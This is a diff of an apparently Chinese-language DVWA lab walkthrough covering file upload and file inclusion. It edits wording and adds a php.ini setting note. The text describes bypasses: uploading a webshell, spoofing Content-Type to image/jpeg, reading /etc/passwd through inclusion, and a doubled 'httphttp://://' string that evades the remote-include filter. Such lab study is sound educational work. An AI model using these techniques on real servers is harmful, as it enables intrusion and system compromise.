@@ -474,7 +474,7 @@
      <span class="token operator">&amp;</span><span class="token shell-comment comment">#125;     </span>
  <span class="token operator">&amp;</span><span class="token shell-comment comment">#125; </span>
 <span class="token delimiter">?></span> </code></pre>
-<p>从源码里可以看出对上传的文件没有做任何的检测。所以直接上传木马文件即可获取webshell。</p>
+<p>从源码里可以看出对上传的文件没有做任何的检测。所以可以直接上传webshell。</p>
 <p>②Medium</p>
 <pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span>   
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'Upload'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;       </span>
@@ -499,7 +499,7 @@
      <span class="token operator">&amp;</span><span class="token shell-comment comment">#125; </span>
 <span class="token delimiter">?></span> </code></pre>
 <p>从源码中可以看见，通过$_FILES来获取上传文件的名字，类型，大小。如果文件类型和大小符合要求就可以上传。</p>
-<p>所以可以用burp进行拦截修改Connect-Type 为 image/jpeg  即可上传成功，获取webshell。</p>
+<p>所以可以用burp进行拦截修改Connect-Type 为 image/jpeg  即可上传成功webshell。</p>
 <p>③High</p>
 <pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span> 
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'Upload'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span><span class="token shell-comment comment">#123;       </span>
@@ -535,7 +535,7 @@
  <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//The page we wish to display </span>
  <span class="token delimiter">?></span> </code></pre>
 <p>对包含的文件没有做任何的限制，所以可以读取些敏感目录如：/etc/passwd</p>
-<p>可以结合文件上传漏洞，现在文件上传漏洞那上传一张图片马，然后利用文件包含漏洞进行解析，获取webshell。</p>
+<p>可以结合文件上传漏洞，先在文件上传漏洞那上传一张图片马，然后利用文件包含漏洞进行解析，上传webshell。</p>
 <p>②Medium</p>
 <pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span>   
  <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">// The page we wish to display    // Bad input validation   </span>
@@ -545,6 +545,8 @@
 <p>这里本地包含没有问题，但是把http://和https://替换成空。看似不能进行远程包含，但和SQL注入绕过一样，进行叠加即可绕过。</p>
 <p>#example:  httphttp://://x.x.x/1.txt</p>
 <p>可以用自己的kali来当另一台服务器角色，在kali里启动apache服务，在物理机上进行访问(访问kali的ip，可以访问到apache的页面，什么也没有)，然后在var/www/html下随便写个文件保存。再在物理机上如果可以访问到就没问题。再去靶场进行远程文件包含。</p>
+<p>注：</p>
+<p>在php.ini中，allow_url_include 和allow_url_upload都要设为On。</p>
 <p>①High</p>
 <pre class=" language-php"><code class="language-php"> <span class="token delimiter">&lt;?php</span>       
  <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'page'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment" spellcheck="true">//The page we wish to display    // Only allow include.php   </span>
